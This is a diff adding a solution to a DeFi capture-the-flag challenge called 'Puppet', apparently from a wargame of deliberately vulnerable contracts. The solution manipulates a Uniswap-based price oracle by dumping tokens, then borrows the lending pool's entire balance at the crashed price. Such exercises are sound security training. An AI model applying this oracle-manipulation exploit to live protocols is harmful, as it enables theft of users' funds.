@@ -103,6 +103,28 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // First approve the exchange to move our tokens
+        await this.token.connect(attacker)
+          .approve(this.uniswapExchange.address, ethers.utils.parseEther('100000000'))
+
+        // Sell almost all of our tokens to crash the price
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE.sub(1), 1,
+            (await ethers.provider.getBlock('latest')).timestamp * 2);
+
+        // Check what is the current price according to the lending pool
+        let depositPrice =  await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther('1'));
+        console.log(`\tDeposit needed for 1 token: ${ethers.utils.formatEther(depositPrice)}`)
+
+        // How much ETH do we need to borrow all tokens?
+        let ethNeededToDrainPool = depositPrice.mul(POOL_INITIAL_TOKEN_BALANCE).div(ethers.utils.parseEther('1'))
+        console.log(`\tETH Needed to drain pool: ${ethers.utils.formatEther(ethNeededToDrainPool)}`)
+
+        // Borrow tokens with the new price :)
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {value: ethNeededToDrainPool})
+
+        // Again, this should probably be done in a single transaction via a smart contract, 
+        // otherwise others will also take advantage of the new price before you have a chance to...
     });
 
     after(async function () {
